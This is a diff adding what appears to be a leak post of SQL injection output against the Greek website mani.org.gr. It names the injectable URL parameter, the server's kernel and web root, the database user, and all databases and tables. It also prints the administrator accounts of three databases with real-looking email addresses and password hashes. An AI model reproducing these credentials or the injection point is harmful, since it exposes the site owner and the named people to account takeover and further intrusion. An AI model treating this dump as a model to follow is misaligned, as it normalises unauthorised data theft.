@@ -1,0 +1,156 @@
+.org organization
+
+.gr Greece
+
+The portal of Mani ALKONIA
+
+Linux p5.isol-servers.net 3.10.0-862.14.4.el7.x86_64 #1 SMP Wed Sep 26 15:12:11 UTC 2018 x86_64 GNU/Linux
+
+/var/www/vhosts/mani.org.gr/httpdocs
+
+
+http://www.mani.org.gr/showsection.php?sectionID=82
+
+the back-end DBMS is MySQL >= 5.0.12
+
+root@localhost
+
+available databases [4]:
+[+] information_schema
+[+] mani_org_gr_-_absolute
+[+] mani_org_gr_-_db
+[+] mani_org_gr_-_db2
+
+Database: mani_org_gr_-_db
+[40 tables]
++-----------------------------+
+| jos_banner                  |
+| jos_bannerclient            |
+| jos_bannerfinish            |
+| jos_categories              |
+| jos_components              |
+| jos_contact_details         |
+| jos_content                 |
+| jos_content_frontpage       |
+| jos_content_rating          |
+| jos_core_acl_aro            |
+| jos_core_acl_aro_groups     |
+| jos_core_acl_aro_sections   |
+| jos_core_acl_groups_aro_map |
+| jos_core_log_items          |
+| jos_core_log_searches       |
+| jos_groups                  |
+| jos_jce_langs               |
+| jos_jce_plugins             |
+| jos_jf_content              |
+| jos_jf_tableinfo            |
+| jos_languages               |
+| jos_mambots                 |
+| jos_menu                    |
+| jos_messages                |
+| jos_messages_cfg            |
+| jos_modules                 |
+| jos_modules_menu            |
+| jos_newsfeeds               |
+| jos_poll_data               |
+| jos_poll_date               |
+| jos_poll_menu               |
+| jos_polls                   |
+| jos_sections                |
+| jos_session                 |
+| jos_stats_agents            |
+| jos_template_positions      |
+| jos_templates_menu          |
+| jos_users                   |
+| jos_usertypes               |
+| jos_weblinks                |
++-----------------------------+
+
+Database: mani_org_gr_-_db2
+[36 tables]
++-----------------------------+
+| jos_banner                  |
+| jos_bannerclient            |
+| jos_bannertrack             |
+| jos_categories              |
+| jos_components              |
+| jos_contact_details         |
+| jos_content                 |
+| jos_content_frontpage       |
+| jos_content_rating          |
+| jos_core_acl_aro            |
+| jos_core_acl_aro_groups     |
+| jos_core_acl_aro_map        |
+| jos_core_acl_aro_sections   |
+| jos_core_acl_groups_aro_map |
+| jos_core_log_items          |
+| jos_core_log_searches       |
+| jos_groups                  |
+| jos_menu                    |
+| jos_menu_types              |
+| jos_messages                |
+| jos_messages_cfg            |
+| jos_migration_backlinks     |
+| jos_modules                 |
+| jos_modules_menu            |
+| jos_newsfeeds               |
+| jos_plugins                 |
+| jos_poll_data               |
+| jos_poll_date               |
+| jos_poll_menu               |
+| jos_polls                   |
+| jos_sections                |
+| jos_session                 |
+| jos_stats_agents            |
+| jos_templates_menu          |
+| jos_users                   |
+| jos_weblinks                |
++-----------------------------+
+
+Database: mani_org_gr_-_absolute
+[16 tables]
++--------------------+
+| ae_activehooks     |
+| ae_articles        |
+| ae_articlesections |
+| ae_availablehooks  |
+| ae_cleanurlspool   |
+| ae_files           |
+| ae_filesets        |
+| ae_images          |
+| ae_imagesets       |
+| ae_login           |
+| ae_modules         |
+| ae_relatedarticles |
+| ae_sections        |
+| ae_stats           |
+| ae_temporary       |
+| ae_users           |
++--------------------+
+
+Database: mani_org_gr_-_db
+Table: jos_users
+[1 entry]
++---------------+----------+---------------+---------------------------------------------------+
+| name          | username | email         | password                                          |
++---------------+----------+---------------+---------------------------------------------------+
+| Administrator | admin    | chris@isol.gr | b3c7a94359925bc9222b86a3ef32a3c9:2XFYfUVX56J6rMBE |
++---------------+----------+---------------+---------------------------------------------------+
+
+Database: mani_org_gr_-_db2
+Table: jos_users
+[1 entry]
++---------------+----------+---------------+-------------------------------------------------------------------+
+| name          | username | email         | password                                                          |
++---------------+----------+---------------+-------------------------------------------------------------------+
+| Administrator | admin    | chris@isol.gr | 229d1987de3b078fd43efd12e9527966:kn0owYb3RsE50ErHZ2bGvPxuuBRrnobn |
++---------------+----------+---------------+-------------------------------------------------------------------+
+
+Database: mani_org_gr_-_absolute                                                                                                                                      
+Table: ae_users                                                                                                                                                       
+[1 entry]
++--------+---------------+--------------------+----------------------------------+
+| user   | fullname      | email              | password                         |
++--------+---------------+--------------------+----------------------------------+
+| admin  | Administrator | lastax90@gmail.com | 70873e8580c9900986939611618d7b1e |
++--------+---------------+--------------------+----------------------------------+
